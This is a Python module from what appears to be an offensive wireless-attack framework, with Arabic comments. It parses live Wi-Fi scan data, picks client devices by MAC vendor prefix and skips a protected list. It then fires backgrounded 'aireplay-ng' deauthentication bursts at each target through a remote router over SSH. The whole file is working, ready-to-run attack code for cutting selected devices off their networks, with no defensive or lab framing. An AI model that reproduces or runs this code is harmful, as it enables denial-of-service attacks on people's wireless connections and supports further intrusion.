#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate C3 Framework - Hardened Tactical Target Filter Engine (OUI Integrated)
File: /home/kali/C3_Framework/modules/target_filter_engine.py
"""

import os
import csv
import time
import datetime
import traceback
import re
from core.database import DatabaseManager
from core.ssh_executor import SSHHardwareExecutor
from modules.oui_filter_module import OUITargetFilterModule

class TargetFilterEngine:
    def __init__(self, ssh_executor: SSHHardwareExecutor, db_manager: DatabaseManager):
        self.executor = ssh_executor
        self.db = db_manager
        self.log_path = "/home/kali/C3_Framework/storage/logs/attack_errors.log"
        self.oui_filter = OUITargetFilterModule()
        self.ram_cache = {}
        self.missing_counter = {}

    def _trigger_double_guard(self, line_num, reason, stack_trace):
        print(f"\033[91m[!] CRITICAL - Class: TargetFilterEngine | Line: {line_num} | Reason: {reason}\033[0m")
        try:
            with open(self.log_path, "a", encoding="utf-8") as log_file:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_file.write(f"[{timestamp}] CRITICAL - Class: TargetFilterEngine | Line: {line_num} | Reason: {reason}\n")
                log_file.write(f"Stack Trace:\n{stack_trace}\n{'-'*50}\n")
        except IOError:
            pass

    def process_radar_stream_and_inject(self, csv_filepath, actual_mon_name, airserv_port):
        if not os.path.exists(csv_filepath) or os.path.getsize(csv_filepath) == 0:
            return

        protected_pool = self.db.load_static_blacklist_pool()
        current_scanned_macs = set()
        
        try:
            with open(csv_filepath, mode="r", encoding="utf-8", errors="ignore") as stream_file:
                reader = csv.reader(stream_file)
                
                for row in reader:
                    if not row or len(row) < 5:
                        continue
                    
                    target_mac = row[0].strip().lower()
                    if not re.match(r'^([0-9a-f]{2}[:-]){5}([0-9a-f]{2})$', target_mac):
                        continue
                        
                    current_scanned_macs.add(target_mac)
                    
                    # 1. درع حماية الماكات المحمية الصلب
                    if target_mac in protected_pool:
                        continue
                        
                    bssid = row[5].strip().lower() if len(row) > 5 else ""
                    if bssid in protected_pool:
                        continue

                    # 2. الفرز الجراحي للبصمات والـ OUI الموجه لمنع ضياع الحزم
                    if not self.oui_filter.is_device_targeted(target_mac):
                        continue

                    # 3. خزنة حظر التكرار في الرام
                    current_time = time.time()
                    if target_mac in self.ram_cache:
                        if current_time - self.ram_cache[target_mac] < 5:
                            print(f"[-] [Target Blocked] ... {self.oui_filter.render_scanned_target_details(target_mac)} already isolated.")
                            continue

                    # 4. طور الحقن الداخلي الصريح
                    router_ip = self.executor.ip
                    injection_cmd = [
                        "/bin/sh", "-c",
                        f"aireplay-ng -0 5 -a {bssid} -c {target_mac} {router_ip}:{airserv_port} > /dev/null 2>&1 &"
                    ]
                    
                    print(f"\033[92m[+] [SURGICAL SPOTTED] -> Isolating {self.oui_filter.render_scanned_target_details(target_mac)}\033[0m")
                    self.executor.execute_raw_command(injection_cmd)
                    
                    self.ram_cache[target_mac] = current_time
                    self.missing_counter[target_mac] = 0

            # الـ TTL والـ Eviction للأهداف المختفية
            for cached_mac in list(self.ram_cache.keys()):
                if cached_mac not in current_scanned_macs:
                    self.missing_counter[cached_mac] = self.missing_counter.get(cached_mac, 0) + 1
                    if self.missing_counter[cached_mac] >= 2:
                        del self.ram_cache[cached_mac]
                        del self.missing_counter[cached_mac]

        except Exception as e:
            tb = traceback.extract_tb(e.__traceback__)
            line_num = tb[-1].lineno if tb else "StreamParser"
            self._trigger_double_guard(line_num, f"OUI integrated stream parsing collapsed: {str(e)}", traceback.format_exc())
